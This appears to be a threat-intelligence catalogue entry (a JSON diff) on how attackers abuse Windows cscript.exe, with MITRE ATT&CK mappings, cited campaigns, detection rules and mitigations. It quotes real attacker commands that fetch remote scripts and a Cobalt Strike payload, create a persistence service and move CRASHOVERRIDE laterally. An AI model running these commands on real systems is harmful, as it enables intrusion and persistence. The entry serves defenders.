@@ -1,0 +1,260 @@
+{
+  "type": "lolbin",
+  "version": 2,
+  "id": "82082987-ccb3-4de9-8b3f-093e8e51919f",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-16T00:16:00.000Z",
+  "modified": "2026-10-16T00:16:00.000Z",
+  "name": "Cscript.exe",
+  "image": "cscript.exe",
+  "description": "Binary used to execute scripts in Windows",
+  "attack": {
+    "id": "T1059.005",
+    "name": "Visual Basic",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1059/005",
+    "version": "20.0"
+  },
+  "summary": [
+    "Execute VBScript and JScript files from the console",
+    "Execute scripts stored in alternate data streams",
+    "Enable WinRM with winrm.vbs as a backup persistence mechanism",
+    "Run scripts from a Windows service for persistence"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\System32\\cscript.exe",
+    "C:\\Windows\\SysWOW64\\cscript.exe"
+  ],
+  "hashes": {
+    "MD5": "24590BF74BBBBFD7D7AC070F4E3C44FD"
+  },
+  "capabilities": [
+    "Execute",
+    "Alternate data streams"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0002:Execution:T1059.005",
+    "TA0002:Execution:T1059.007"
+  ],
+  "relationship": {
+    "associated_apts": [],
+    "associated_campaigns": [
+      {
+        "name": "Operation CuckooBees",
+        "attack_id": "C0012",
+        "evidence": "names cscript.exe",
+        "description": "During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: `cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}`.",
+        "sources": "Cybereason OperationCuckooBees May 2022 https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "STARWHALE",
+        "attack_id": "S1037",
+        "evidence": "names cscript.exe",
+        "description": "STARWHALE has the ability to create the following Windows service to establish persistence on an infected host: `sc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale\" start= \"auto\" obj= \"LocalSystem\"`.",
+        "sources": "Mandiant UNC3313 Feb 2022 https://www.mandiant.com/resources/telegram-malware-iranian-espionage"
+      }
+    ],
+    "associated_tools": [],
+    "technique_only": [],
+    "associated_commands": [
+      {
+        "command": "cscript.exe //nologo m.vbs",
+        "intent": "Run a VBS script, one of the process arguments listed for the WannaCry ransomware.",
+        "status": "verified",
+        "source_name": "FireEye WannaCry 2017",
+        "source_url": "https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html"
+      },
+      {
+        "command": "cscript.exe //E:jscript \\\\\\\\xxd[.]cc\\\\bwou.png",
+        "intent": "Run a remote JScript file from an attacker-controlled server after exploiting CVE-2017-11882.",
+        "status": "verified",
+        "source_name": "unit42.paloaltonetworks.com",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/"
+      },
+      {
+        "command": "/Q /c cscript c:\\windows\\temp\\OAKMZ.vbs c:\\windows\\temp\\OAKMZ.txt",
+        "intent": "Discovery: run the actor's custom VBS reconnaissance script and save the results to a text file.",
+        "status": "verified",
+        "source_name": "FoxIT Wocao December 2019",
+        "source_url": "https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      },
+      {
+        "command": "cscript //e:jscript ibivigi.txt",
+        "intent": "Run the FIN7 JScript first-stage script, saved with a .txt extension and launched by the .xsl file, that gathers host information through WMI queries.",
+        "status": "verified",
+        "source_name": "Splunk FIN7 Tools Resurface November 2021",
+        "source_url": "https://www.splunk.com/en_us/blog/security/fin7-tools-resurface-in-the-field-splinter-or-copycat.html"
+      },
+      {
+        "command": "cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback__whale",
+        "intent": "Run the STARWHALE Windows Script File backdoor with the argument humpback__whale.",
+        "status": "verified",
+        "source_name": "Mandiant UNC3313 February 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/telegram-malware-iranian-espionage"
+      },
+      {
+        "command": "sc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback__whale\" start= \"auto\" obj= \"LocalSystem\"",
+        "intent": "Create a Windows service that runs the STARWHALE script as LocalSystem at boot, because the malware has no persistence of its own.",
+        "status": "verified",
+        "source_name": "Mandiant UNC3313 February 2022",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/telegram-malware-iranian-espionage"
+      },
+      {
+        "command": "cscript spamfilter_v1.4331.vbs",
+        "intent": "Run a VBScript dropped after the attacker gained AnyDesk access; it starts a PowerShell command and then the AutoIt DarkGate payload.",
+        "status": "verified",
+        "source_name": "Trend Micro DarkGate Teams Vishing December 2024",
+        "source_url": "https://www.trendmicro.com/en_us/research/24/l/darkgate-malware.html"
+      },
+      {
+        "command": "\"C:\\Windows\\system32\\cmd.exe\" /c cscript C:\\users\\public\\downloads\\x.vbs hxxps://jobquest[.]ph/tt.png C:\\users\\public\\downloads\\1.png",
+        "intent": "Download a Cobalt Strike payload disguised as a .png file from the attackers' compromised web server into C:\\users\\public\\downloads. The report prints two more commands that differ only in file names (2.png and 3.png).",
+        "status": "verified",
+        "source_name": "Sophos MDR Mimic Ransomware STAC6451 August 2024",
+        "source_url": "https://www.sophos.com/en-us/blog/sophos-mdr-hunt-tracks-mimic-ransomware-campaign-against-organizations-in-india"
+      },
+      {
+        "command": "C:\\Windows\\System32\\cscript.exe REHABI~1.JS",
+        "intent": "Run the GootLoader second-stage JavaScript, which spawns PowerShell.",
+        "status": "verified",
+        "source_name": "Sophos GootLoader Bengal Cat Campaign November 2024",
+        "source_url": "https://www.sophos.com/en-us/blog/bengal-cat-lovers-in-australia-get-psspsspssd-in-google-driven-gootloader-campaign"
+      },
+      {
+        "command": "cscript C:\\Backinfo\\ufn.vbs <TargetIP 1> \"C:\\Backinfo\\104.dll\" \"C:\\Delta\\104.dll\"",
+        "intent": "Remotely copy the CRASHOVERRIDE payload DLL to another host with a script, using captured credentials. The slide prints <TargetIP 1> as a placeholder for the real address.",
+        "status": "verified",
+        "source_name": "Dragos CRASHOVERRIDE Anatomy of an Attack October 2018",
+        "source_url": "https://www.virusbulletin.com/uploads/pdf/conference_slides/2018/Slowik-VB2018-CRASHOVERRIDE.pdf"
+      },
+      {
+        "command": "cscript C:\\Backinfo\\sqlc.vbs <TargetIP 1> \"-c\" \"sc config ImapiService binPath= 'C:\\Delta\\svchost.exe C:\\Delta\\ 104.dll 104.ini' start= auto && sc start ImapiService\"",
+        "intent": "Run a remote command on another host through a script, reconfiguring a service so that it launches the CRASHOVERRIDE payload, then start it. The slide prints <TargetIP 1> as a placeholder.",
+        "status": "verified",
+        "source_name": "Dragos CRASHOVERRIDE Anatomy of an Attack October 2018",
+        "source_url": "https://www.virusbulletin.com/uploads/pdf/conference_slides/2018/Slowik-VB2018-CRASHOVERRIDE.pdf"
+      }
+    ]
+  },
+  "detections": {
+    "eventsid": [
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 1,
+        "data_components": "Process Creation",
+        "techniques": "T1059.005, T1059.007"
+      },
+      {
+        "log": "WinEventLog:Sysmon",
+        "event_id": 7,
+        "data_components": "Module Load",
+        "techniques": "T1059.005, T1059.007"
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml"
+      },
+      {
+        "title": "WScript or CScript Dropper - File",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_cscript_wscript_dropper.yml"
+      },
+      {
+        "title": "Local Network Connection Initiated By Script Interpreter",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/network_connection/net_connection_win_wscript_cscript_local_connection.yml"
+      },
+      {
+        "title": "Outbound Network Connection Initiated By Script Interpreter",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/network_connection/net_connection_win_wscript_cscript_outbound_connection.yml"
+      },
+      {
+        "title": "Potential Dropper Script Execution Via WScript/CScript/MSHTA",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wscript_cscript_mshta_dropper.yml"
+      },
+      {
+        "title": "Cscript/Wscript Uncommon Script Extension Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wscript_cscript_uncommon_extension_exec.yml"
+      }
+    ],
+    "related_sigma_rules": 101,
+    "other_rules": [
+      "https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_unusual_dir_ads.toml",
+      "https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/command_and_control_remote_file_copy_scripts.toml",
+      "https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml",
+      "https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/wscript_or_cscript_suspicious_child_process.yml"
+    ]
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1021",
+      "name": "Restrict Web-Based Content",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1040",
+      "name": "Behavior Prevention on Endpoint",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1049",
+      "name": "Antivirus/Antimalware",
+      "technique": "T1059.005"
+    },
+    {
+      "id": "M1021",
+      "name": "Restrict Web-Based Content",
+      "technique": "T1059.007"
+    },
+    {
+      "id": "M1040",
+      "name": "Behavior Prevention on Endpoint",
+      "technique": "T1059.007"
+    },
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "technique": "T1059.007"
+    },
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1059.007"
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/techniques/T1059/005",
+    "https://lolbas-project.github.io/lolbas/Binaries/Cscript/",
+    "https://strontic.github.io/xcyclopedia/library/cscript.exe-24590BF74BBBBFD7D7AC070F4E3C44FD.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
